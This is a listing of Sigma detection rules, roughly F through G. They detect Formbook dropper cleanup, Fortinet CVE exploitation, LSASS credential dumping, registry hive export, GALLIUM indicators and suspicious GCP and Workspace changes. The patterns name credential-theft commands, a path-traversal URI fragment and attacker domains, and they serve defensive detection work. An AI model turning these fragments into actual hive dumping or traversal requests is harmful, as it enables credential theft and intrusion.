<li><a href="#">title:Formbook Process Creation id: 032f5fb3-d959-41a5-9263-4173c802dc2b status: test description: Detects Formbook like process executions that inject code into a set of files in the System32 folder, which executes a special command command line to delete the dropper from the AppData Temp folder. We avoid false positives by excluding all parent process with command line parameters. author: Florian Roth, oscd.community, Jonhnathan Ribeiro references: - - - - date: 2019/09/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: # Parent command line should not contain a space value # This avoids false positives not caused by process injection # e.g. wscript.exe /B sysmon-install.vbs ParentCommandLine|startswith: - 'C:\Windows\System32\' - 'C:\Windows\SysWOW64\' ParentCommandLine|endswith: '.exe' selection2: - CommandLine|contains|all: - '/c' - 'del' - 'C:\Users\' - '\AppData\Local\Temp\' - CommandLine|contains|all: - '/c' - 'del' - 'C:\Users\' - '\Desktop\' - CommandLine|contains|all: - '/C' - 'type nul >' - 'C:\Users\' - '\Desktop\' selection3: CommandLine|endswith: '.exe' condition: selection and selection2 and selection3 fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.develop_capabilities - attack.t1587.001 
<li><a href="#">title:Fortinet CVE-2018-13379 Exploitation id: a2e97350-4285-43f2-a63f-d0daff291738 status: test description: Detects CVE-2018-13379 exploitation attempt against Fortinet SSL VPNs author: Bhabesh Raj references: - date: 2020/12/08 modified: 2022/01/07 logsource: category: webserver detection: selection: c-uri|contains|all: - 'lang=/../../' - '/dev/cmdb/sslvpn_websession' condition: selection fields: - client_ip - url - response falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:Fortinet CVE-2021-22123 Exploitation description: Detects CVE-2021-22123 exploitation attempt against Fortinet WAFs id: f425637f-891c-4191-a6c4-3bb1b70513b4 status: experimental references: - author: Bhabesh Raj, Florian Roth date: 2021/08/19 modified: 2021/11/23 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection: c-uri|contains: '/api/v2.0/user/remoteserver.saml' cs-method: POST filter1: cs-referer|contains: '/root/user/remote-user/saml-user/' filter2: cs-referer: null condition: selection and not filter1 and not filter2 fields: - c-ip - url - response falsepositives: - Unknown level: critical 
<li><a href="#">title:FromBase64String Command Line id: e32d4572-9826-4738-b651-95fa63747e8a status: test description: Detects suspicious FromBase64String expressions in command line arguments author: Florian Roth references: - date: 2020/01/29 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: '::FromBase64String(' condition: selection falsepositives: - Administrative script libraries level: high tags: - attack.t1027 - attack.defense_evasion - attack.t1140 - attack.t1059.001 
<li><a href="#">title:F-Secure C3 Load by Rundll32 status: test id: b18c9d4c-fac9-4708-bd06-dd5bfacf200f author: Alfie Champion (ajpc500) date: 2021/06/02 description: F-Secure C3 produces DLLs with a default exported StartNodeRelay function. references: - tags: - attack.defense_evasion - attack.t1218.011 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'rundll32.exe' - '.dll' - 'StartNodeRelay' condition: selection falsepositives: - Unknown level: critical 
<li><a href="#">title:Fsutil Behavior Set SymlinkEvaluation id: c0b2768a-dd06-4671-8339-b16ca8d1f27f status: experimental description: | A symbolic link is a type of file that contains a reference to another file. This is probably done to make sure that the ransomware is able to follow shortcuts on the machine in order to find the original file to encrypt references: - - author: frack113 date: 2022/03/02 modified: 2022/06/02 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\fsutil.exe' CommandLine|contains|all: - 'behavior ' - 'set ' - 'SymlinkEvaluation' condition: selection falsepositives: - Legitimate use level: medium tags: - attack.execution - attack.t1059 
<li><a href="#">title:Fsutil Drive Enumeration id: 63de06b9-a385-40b5-8b32-73f2b9ef84b6 status: experimental description: Attackers may leverage fsutil to enumerated connected drives. author: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io' date: 2022/03/29 references: - Turla has used fsutil fsinfo drives to list connected drives. - logsource: category: process_creation product: windows detection: binary_1: Image|endswith: '\fsutil.exe' binary_2: OriginalFileName: 'fsutil.exe' selection: CommandLine|contains: 'drives' condition: (1 of binary_*) and selection falsepositives: - Certain software or administrative tasks may trigger false positivies. level: low tags: - attack.peripheral_device_discovery - attack.t1120 
<li><a href="#">title:Fsutil Suspicious Invocation id: add64136-62e5-48ea-807e-88638d02df1e status: stable description: Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size, etc). Might be used by ransomwares during the attack (seen by NotPetya and others). author: Ecco, E.M. Anhaus, oscd.community references: - - - date: 2019/09/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: binary_1: Image|endswith: '\fsutil.exe' binary_2: OriginalFileName: 'fsutil.exe' selection: CommandLine|contains: - 'deletejournal' # usn deletejournal ==> generally ransomware or attacker - 'createjournal' # usn createjournal ==> can modify config to set it to a tiny size condition: (1 of binary_*) and selection falsepositives: - Admin activity - Scripts and administrative tools used in the monitored environment level: high tags: - attack.defense_evasion - attack.t1070 
<li><a href="#">title:GAC DLL Loaded Via Office Applications id: 90217a70-13fc-48e4-b3db-0d836c5824ac status: test description: Detects any GAC DLL being loaded by an Office Product author: Antonlovesdnb references: - date: 2020/02/19 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - '\winword.exe' - '\powerpnt.exe' - '\excel.exe' - '\outlook.exe' ImageLoaded|startswith: 'C:\Windows\Microsoft.NET\assembly\GAC_MSIL' condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: high tags: - attack.execution - attack.t1204.002 
<li><a href="#">title:GALLIUM Artefacts id: 18739897-21b1-41da-8ee4-5b786915a676 related: - id: 440a56bf-7873-4439-940a-1c8a671073c2 type: derived status: experimental description: Detects artefacts associated with activity group GALLIUM - Microsoft Threat Intelligence Center indicators released in December 2019. author: Tim Burrell date: 2020/02/07 modified: 2021/09/19 references: - - (v=ws.11) tags: - attack.credential_access - attack.t1212 - attack.command_and_control - attack.t1071 logsource: product: windows category: process_creation detection: legitimate_process_path: Image|contains: - ':\Program Files(x86)\' - ':\Program Files\' legitimate_executable: sha1: 'e570585edc69f9074cb5e8a790708336bd45ca0f' condition: legitimate_executable and not legitimate_process_path falsepositives: - Unknown level: high 
<li><a href="#">title:GALLIUM Artefacts id: 3db10f25-2527-4b79-8d4b-471eb900ee29 related: - id: 440a56bf-7873-4439-940a-1c8a671073c2 type: derived status: experimental description: Detects artefacts associated with activity group GALLIUM - Microsoft Threat Intelligence Center indicators released in December 2019. author: Tim Burrell date: 2020/02/07 modified: 2021/09/19 references: - - (v=ws.11) tags: - attack.credential_access - attack.command_and_control - attack.t1071 logsource: product: windows service: dns-server detection: selection: EventID: 257 QNAME: - 'asyspy256.ddns.net' - 'hotkillmail9sddcc.ddns.net' - 'rosaf112.ddns.net' - 'cvdfhjh1231.myftp.biz' - 'sz2016rose.ddns.net' - 'dffwescwer4325.myftp.biz' - 'cvdfhjh1231.ddns.net' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:GALLIUM Artefacts id: 440a56bf-7873-4439-940a-1c8a671073c2 status: experimental description: Detects artefacts associated with activity group GALLIUM - Microsoft Threat Intelligence Center indicators released in December 2019. author: Tim Burrell date: 2020/02/07 modified: 2021/09/19 references: - - (v=ws.11) tags: - attack.credential_access - attack.t1212 - attack.command_and_control - attack.t1071 logsource: product: windows category: process_creation detection: selection: sha1: - '53a44c2396d15c3a03723fa5e5db54cafd527635' - '9c5e496921e3bc882dc40694f1dcc3746a75db19' - 'aeb573accfd95758550cf30bf04f389a92922844' - '79ef78a797403a4ed1a616c68e07fff868a8650a' - '4f6f38b4cec35e895d91c052b1f5a83d665c2196' - '1e8c2cac2e4ce7cbd33c3858eb2e24531cb8a84d' - 'e841a63e47361a572db9a7334af459ddca11347a' - 'c28f606df28a9bc8df75a4d5e5837fc5522dd34d' - '2e94b305d6812a9f96e6781c888e48c7fb157b6b' - 'dd44133716b8a241957b912fa6a02efde3ce3025' - '8793bf166cb89eb55f0593404e4e933ab605e803' - 'a39b57032dbb2335499a51e13470a7cd5d86b138' - '41cc2b15c662bc001c0eb92f6cc222934f0beeea' - 'd209430d6af54792371174e70e27dd11d3def7a7' - '1c6452026c56efd2c94cea7e0f671eb55515edb0' - 'c6b41d3afdcdcaf9f442bbe772f5da871801fd5a' - '4923d460e22fbbf165bbbaba168e5a46b8157d9f' - 'f201504bd96e81d0d350c3a8332593ee1c9e09de' - 'ddd2db1127632a2a52943a2fe516a2e7d05d70d2' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Gatekeeper Bypass via Xattr id: f5141b6d-9f42-41c6-a7bf-2a780678b29b status: test description: Detects macOS Gatekeeper bypass via xattr utility author: Daniil Yugoslavskiy, oscd.community references: - date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image|endswith: '/xattr' CommandLine|contains|all: - '-r' - 'com.apple.quarantine' condition: selection falsepositives: - Legitimate activities level: low tags: - attack.defense_evasion - attack.t1553.001 
<li><a href="#">title:GatherNetworkInfo.vbs Script Usage id: 575dce0c-8139-4e30-9295-1ee75969f7fe description: Adversaries can abuse of C:\Windows\System32\gatherNetworkInfo.vbs script along with cscript.exe to gather information about the target status: experimental references: - author: blueteamer8699 date: 2022/01/03 tags: - attack.discovery - attack.group_policy_discovery - attack.execution - attack.command_and_scripting_interpreter - attack.visual_basic - attack.t1059.005 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'cscript.exe' - 'gatherNetworkInfo.vbs' condition: selection falsepositives: - Administrative activity fields: - CommandLine - ParentImage level: medium 
<li><a href="#">title:Generic Password Dumper Activity on LSASS id: 4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76 description: Detects process handle on LSASS process with certain access mask status: experimental author: Roberto Rodriguez, Teymur Kheirkhabarov, Dimitrios Slamaris, Mark Russinovich, Aleksey Potapov, oscd.community (update) date: 2019/11/01 modified: 2022/04/29 references: - - tags: - attack.credential_access - car.2019-04-004 - attack.t1003.001 logsource: product: windows service: security detection: selection_1: EventID: 4656 ObjectName|endswith: '\lsass.exe' AccessMask|contains: - '0x40' - '0x1400' # - '0x1000' # minimum access requirements to query basic info from service - '0x100000' - '0x1410' # car.2019-04-004 - '0x1010' # car.2019-04-004 - '0x1438' # car.2019-04-004 - '0x143a' # car.2019-04-004 - '0x1418' # car.2019-04-004 - '0x1f0fff' - '0x1f1fff' - '0x1f2fff' - '0x1f3fff' selection_2: EventID: 4663 ObjectName|endswith: '\lsass.exe' AccessList|contains: - '4484' - '4416' filter1: ProcessName|endswith: - '\wmiprvse.exe' - '\taskmgr.exe' - '\procexp64.exe' - '\procexp.exe' - '\lsm.exe' - '\csrss.exe' - '\wininit.exe' - '\vmtoolsd.exe' - '\minionhost.exe' # Cyberreason - '\VsTskMgr.exe' # McAfee Enterprise - '\thor.exe' # THOR - '\thor64.exe' # THOR - '\MicrosoftEdgeUpdate.exe' - '\GamingServices.exe' - '\svchost.exe' - '\MsMpEng.exe' # Defender - '\MRT.exe' # MS Malware Removal Tool - 'RtkAudUService64' # ProcessName|startswith: - C:\Windows\System32\ - C:\Windows\SysWow64\ - C:\Windows\SysNative\ - C:\Program Files\ - C:\Windows\Temp\asgard2-agent\ - C:\ProgramData\Microsoft\Windows Defender\Platform\ filter2: ProcessName|startswith: 'C:\Program Files' # too many false positives with legitimate AV and EDR solutions filter3: ProcessName: 'C:\Windows\CCM\CcmExec.exe' condition: 1 of selection_* and not 1 of filter* fields: - ComputerName - SubjectDomainName - SubjectUserName - ProcessName - ProcessID falsepositives: - Legitimate software accessing LSASS process for legitimate reason; update the whitelist with it level: high 
<li><a href="#">title:Get-ADUser Enumeration Using UserAccountControl Flags id: 96c982fe-3d08-4df4-bed2-eb14e02f21c8 status: experimental description: Detects AS-REP roasting is an attack that is often-overlooked. It is not very common as you have to explicitly set accounts that do not require pre-authentication. date: 2022/03/17 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: #4194304 DONT_REQ_PREAUTH ScriptBlockText|contains|all: - 'Get-ADUser' - '-Filter' - 'useraccountcontrol' - '-band' - '4194304' condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.discovery - attack.t1057 
<li><a href="#">title:GfxDownloadWrapper.exe Downloads File from Suspicious URL id: eee00933-a761-4cd0-be70-c42fe91731e7 status: test description: Detects when GfxDownloadWrapper.exe downloads file from non standard URL author: Victor Sergeev, oscd.community references: - date: 2020/10/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: image_path: Image|endswith: '\GfxDownloadWrapper.exe' cmd_known_url: CommandLine|contains: 'gameplayapi.intel.com' same_parent: ParentImage|endswith: '\GfxDownloadWrapper.exe' condition: image_path and not cmd_known_url and not same_parent fields: - CommandLine falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1105 
<li><a href="#">title:GlobalFlags Registry Persistence Mechanisms id: 36803969-5421-41ec-b92f-8500f79c23b0 status: test description: Detects persistence using GlobalFlags in image file executiobn options author: Karneades, Jonhnathan Ribeiro references: - date: 2018/04/11 modified: 2022/03/26 logsource: category: registry_set product: windows detection: selection_reg1: TargetObject|contains: '\SOFTWARE\Microsoft\Windows NT\CurrentVersion' selection_reg2: - TargetObject|contains|all: - '\Image File Execution Options\' - '\GlobalFlag' - TargetObject|contains|all: - 'SilentProcessExit\' - '\ReportingMode' - TargetObject|contains|all: - 'SilentProcessExit\' - '\MonitorProcess' condition: selection_reg1 and selection_reg2 falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.persistence - attack.defense_evasion - attack.t1546.012 - car.2013-01-002 
<li><a href="#">title:Google Cloud DNS Zone Modified or Deleted id: 28268a8f-191f-4c17-85b2-f5aa4fa829c3 description: Identifies when a DNS Zone is modified or deleted in Google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/15 references: - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - Dns.ManagedZones.Delete - Dns.ManagedZones.Update - Dns.ManagedZones.Patch condition: selection level: medium tags: - attack.impact falsepositives: - Unknown 
<li><a href="#">title:Google Cloud Firewall Modified or Deleted id: fe513c69-734c-4d4a-8548-ac5f609be82b description: Detects when a firewall rule is modified or deleted in Google Cloud Platform (GCP). author: Austin Songer @austinsonger status: experimental date: 2021/08/13 references: - - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - v*.Compute.Firewalls.Delete - v*.Compute.Firewalls.Patch - v*.Compute.Firewalls.Update - v*.Compute.Firewalls.Insert condition: selection level: medium tags: - attack.defense_evasion - attack.t1562 falsepositives: - Firewall rules being modified or deleted may be performed by a system administrator. Verify that the firewall configuration change was expected. - Exceptions can be added to this rule to filter expected behavior. 
<li><a href="#">title:Google Cloud Kubernetes Admission Controller id: 6ad91e31-53df-4826-bd27-0166171c8040 description: Identifies when an admission controller is executed in GCP Kubernetes. A Kubernetes Admission controller intercepts, and possibly modifies, requests to the Kubernetes API server. The behavior of this admission controller is determined by an admission webhook (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys in the cluster. An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining persistence in the cluster. For example, attackers can intercept and modify the pod creation operations in the cluster and add their malicious container to every created pod. An adversary can use the webhook ValidatingAdmissionWebhook, which could be used to obtain access credentials. An adversary could use the webhook to intercept the requests to the API server, record secrets, and other sensitive information. author: Austin Songer @austinsonger status: experimental date: 2021/11/25 modified: 2021/11/26 references: - logsource: product: gcp service: gcp.audit detection: selection1: gcp.audit.method_name|startswith: admissionregistration.k8s.io.v*.mutatingwebhookconfigurations. gcp.audit.method_name|endswith: - create - patch - replace selection2: gcp.audit.method_name|startswith: admissionregistration.k8s.io.v*.validatingwebhookconfigurations. gcp.audit.method_name|endswith: - create - patch - replace condition: selection1 or selection2 level: medium tags: - attack.persistence - attack.t1078 - attack.credential_access - attack.t1552 - attack.t1552.007 falsepositives: - Google Cloud Kubernetes Admission Controller may be done by a system administrator. - If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Google Cloud Kubernetes CronJob id: cd3a808c-c7b7-4c50-a2f3-f4cfcd436435 description: Identifies when a Google Cloud Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster. author: Austin Songer @austinsonger status: experimental date: 2021/11/22 references: - - - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - io.k8s.api.batch.v*.Job - io.k8s.api.batch.v*.CronJob condition: selection level: medium tags: - attack.persistence - attack.privilege_escalation - attack.execution falsepositives: - Google Cloud Kubernetes CronJob/Job may be done by a system administrator. - If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Google Cloud Kubernetes RoleBinding id: 0322d9f2-289a-47c2-b5e1-b63c90901a3e description: Detects the creation or patching of potential malicious RoleBinding. This includes RoleBindings and ClusterRoleBinding. author: Austin Songer @austinsonger status: experimental date: 2021/08/09 references: - - - - - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - io.k8s.authorization.rbac.v*.clusterrolebindings.create - io.k8s.authorization.rbac.v*.rolebindings.create - io.k8s.authorization.rbac.v*.clusterrolebindings.patch - io.k8s.authorization.rbac.v*.rolebindings.patch - io.k8s.authorization.rbac.v*.clusterrolebindings.update - io.k8s.authorization.rbac.v*.rolebindings.update - io.k8s.authorization.rbac.v*.clusterrolebindings.delete - io.k8s.authorization.rbac.v*.rolebindings.delete condition: selection level: medium tags: - attack.credential_access falsepositives: - RoleBindings and ClusterRoleBinding being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - RoleBindings and ClusterRoleBinding modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Google Cloud Kubernetes Secrets Modified or Deleted id: 2f0bae2d-bf20-4465-be86-1311addebaa3 description: Identifies when the Secrets are Modified or Deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/09 references: - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - io.k8s.core.v*.secrets.create - io.k8s.core.v*.secrets.update - io.k8s.core.v*.secrets.patch - io.k8s.core.v*.secrets.delete condition: selection level: medium tags: - attack.credential_access falsepositives: - Secrets being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Secrets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Google Cloud Re-identifies Sensitive Information id: 234f9f48-904b-4736-a34c-55d23919e4b7 description: Identifies when sensitive information is re-identified in google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/15 references: - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: projects.content.reidentify condition: selection level: medium tags: - attack.impact - attack.t1565 falsepositives: - Unknown 
<li><a href="#">title:Google Cloud Service Account Disabled or Deleted id: 13f81a90-a69c-4fab-8f07-b5bb55416a9f description: Identifies when a service account is disabled or deleted in Google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/14 references: - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name|endswith: - .serviceAccounts.disable - .serviceAccounts.delete condition: selection level: medium tags: - attack.impact - attack.t1531 falsepositives: - Service Account being disabled or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Service Account disabled or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Google Cloud Service Account Modified id: 6b67c12e-5e40-47c6-b3b0-1e6b571184cc description: Identifies when a service account is modified in Google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/14 references: - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name|endswith: - .serviceAccounts.patch - .serviceAccounts.create - .serviceAccounts.update - .serviceAccounts.enable - .serviceAccounts.undelete condition: selection level: medium tags: - attack.impact falsepositives: - Service Account being modified may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Service Account modified from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Google Cloud SQL Database Modified or Deleted id: f346bbd5-2c4e-4789-a221-72de7685090d description: Detect when a Cloud SQL DB has been modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/10/15 references: - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - cloudsql.instances.create - cloudsql.instances.delete - cloudsql.users.update - cloudsql.users.delete condition: selection level: medium tags: - attack.impact falsepositives: - SQL Database being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - SQL Database modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Google Cloud Storage Buckets Enumeration id: e2feb918-4e77-4608-9697-990a1aaf74c3 description: Detects when storage bucket is enumerated in Google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/14 references: - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - storage.buckets.list - storage.buckets.listChannels condition: selection level: low tags: - attack.discovery falsepositives: - Storage Buckets being enumerated may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Storage Buckets enumerated from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Google Cloud Storage Buckets Modified or Deleted id: 4d9f2ee2-c903-48ab-b9c1-8c0f474913d0 description: Detects when storage bucket is modified or deleted in Google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/14 references: - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - storage.buckets.delete - storage.buckets.insert - storage.buckets.update - storage.buckets.patch condition: selection level: medium tags: - attack.impact falsepositives: - Storage Buckets being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Storage Buckets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Google Cloud VPN Tunnel Modified or Deleted id: 99980a85-3a61-43d3-ac0f-b68d6b4797b1 description: Identifies when a VPN Tunnel Modified or Deleted in Google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/16 references: - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - compute.vpnTunnels.insert - compute.vpnTunnels.delete condition: selection level: medium tags: - attack.impact falsepositives: - VPN Tunnel being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - VPN Tunnel modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Google Full Network Traffic Packet Capture id: 980a7598-1e7f-4962-9372-2d754c930d0e description: Identifies potential full network packet capture in gcp. This feature can potentially be abused to read sensitive data from unencrypted internal traffic. author: Austin Songer @austinsonger status: experimental date: 2021/08/13 references: - - logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - v*.Compute.PacketMirrorings.Get - v*.Compute.PacketMirrorings.Delete - v*.Compute.PacketMirrorings.Insert - v*.Compute.PacketMirrorings.Patch - v*.Compute.PacketMirrorings.List - v*.Compute.PacketMirrorings.aggregatedList condition: selection level: medium tags: - attack.collection - attack.t1074 falsepositives: - Full Network Packet Capture may be done by a system or network administrator. - If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Google Workspace Application Removed id: ee2803f0-71c8-4831-b48b-a1fc57601ee4 description: Detects when an an application is removed from Google Workspace. author: Austin Songer status: experimental date: 2021/08/26 references: - - - logsource: product: google_workspace service: google_workspace.admin detection: selection: eventService: admin.googleapis.com eventName: - REMOVE_APPLICATION - REMOVE_APPLICATION_FROM_WHITELIST condition: selection level: medium tags: - attack.impact falsepositives: - Application being removed may be performed by a System Administrator. 
<li><a href="#">title:Google Workspace Granted Domain API Access id: 04e2a23a-9b29-4a5c-be3a-3542e3f982ba description: Detects when an API access service account is granted domain authority. author: Austin Songer status: experimental date: 2021/08/23 references: - - logsource: product: google_workspace service: google_workspace.admin detection: selection: eventService: admin.googleapis.com eventName: AUTHORIZE_API_CLIENT_ACCESS condition: selection level: medium tags: - attack.persistence - attack.t1098 falsepositives: - Unknown 
<li><a href="#">title:Google Workspace MFA Disabled id: 780601d1-6376-4f2a-884e-b8d45599f78c description: Detects when multi-factor authentication (MFA) is disabled. author: Austin Songer status: experimental date: 2021/08/26 modified: 2021/12/02 references: - - - logsource: product: google_workspace service: google_workspace.admin detection: selection_base: eventService: admin.googleapis.com eventName: - ENFORCE_STRONG_AUTHENTICATION - ALLOW_STRONG_AUTHENTICATION selection_eventValue: new_value: 'false' condition: all of selection* level: medium tags: - attack.impact falsepositives: - MFA may be disabled and performed by a system administrator. 
<li><a href="#">title:Google Workspace Role Modified or Deleted id: 6aef64e3-60c6-4782-8db3-8448759c714e description: Detects when an a role is modified or deleted in Google Workspace. author: Austin Songer status: experimental date: 2021/08/24 references: - - logsource: product: google_workspace service: google_workspace.admin detection: selection: eventService: admin.googleapis.com eventName: - DELETE_ROLE - RENAME_ROLE - UPDATE_ROLE condition: selection level: medium tags: - attack.impact falsepositives: - Unknown 
<li><a href="#">title:Google Workspace Role Privilege Deleted id: bf638ef7-4d2d-44bb-a1dc-a238252e6267 description: Detects when an a role privilege is deleted in Google Workspace. author: Austin Songer status: experimental date: 2021/08/24 references: - - logsource: product: google_workspace service: google_workspace.admin detection: selection: eventService: admin.googleapis.com eventName: REMOVE_PRIVILEGE condition: selection level: medium tags: - attack.impact falsepositives: - Unknown 
<li><a href="#">title:Google Workspace User Granted Admin Privileges id: 2d1b83e4-17c6-4896-a37b-29140b40a788 description: Detects when an Google Workspace user is granted admin privileges. author: Austin Songer status: experimental date: 2021/08/23 references: - - logsource: product: google_workspace service: google_workspace.admin detection: selection: eventService: admin.googleapis.com eventName: - GRANT_DELEGATED_ADMIN_PRIVILEGES - GRANT_ADMIN_PRIVILEGE condition: selection level: medium tags: - attack.persistence - attack.t1098 falsepositives: - Google Workspace admin role privileges, may be modified by system administrators. 
<li><a href="#">title:GoToAssist Temporary Installation Artefact id: 5d756aee-ad3e-4306-ad95-cb1abec48de2 status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - author: frack113 date: 2022/02/13 logsource: category: file_event product: windows detection: selection: TargetFilename|contains: '\AppData\Local\Temp\LogMeInInc\GoToAssist Remote Support Expert\' condition: selection falsepositives: - Legitimate use level: medium tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:Gpresult Display Group Policy Information id: e56d3073-83ff-4021-90fe-c658e0709e72 status: experimental description: Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information references: - - - - author: frack113 date: 2022/05/01 logsource: product: windows category: process_creation detection: selection: Image|endswith: '\gpresult.exe' CommandLine|contains: - '/z' - '/v' condition: selection falsepositives: - Unknown level: medium tags: - attack.discovery - attack.t1615 
<li><a href="#">title:Gpscript Execution id: 1e59c230-6670-45bf-83b0-98903780607e status: experimental description: Detects the execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy references: - - author: frack113 date: 2022/05/16 logsource: product: windows category: process_creation detection: selection_img: - Image|endswith: '\gpscript.exe' - OriginalFileName: 'GPSCRIPT.EXE' selection_cli: CommandLine|contains: - ' /logon' - ' /startup' condition: all of selection* falsepositives: - Legitimate uses of logon scripts distributed via group policy level: medium tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:Grabbing Sensitive Hives via Reg Utility id: fd877b94-9bb5-4191-bb25-d79cbd93c167 status: test description: Dump sam, system or security hives using REG.exe utility author: Teymur Kheirkhabarov, Endgame, JHasenbusch, Daniil Yugoslavskiy, oscd.community references: - - - - date: 2019/10/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: '\reg.exe' CommandLine|contains: - 'save' - 'export' - 'Ë¢ave' - 'eË£port' selection_2: CommandLine|contains: - 'hklm' - 'hkËªm' - 'hkey_local_machine' - 'hkey_Ëªocal_machine' - 'hkey_locaËª_machine' - 'hkey_ËªocaËª_machine' selection_3: CommandLine|endswith: - '\system' - '\sam' - '\security' - '\Ë¢ystem' - '\syË¢tem' - '\Ë¢yË¢tem' - '\Ë¢am' - '\Ë¢ecurity' condition: selection_1 and selection_2 and selection_3 falsepositives: - Dumping hives for legitimate purpouse i.e. backup or forensic investigation level: medium tags: - attack.credential_access - attack.t1003.002 - attack.t1003.004 - attack.t1003.005 - car.2013-07-001 
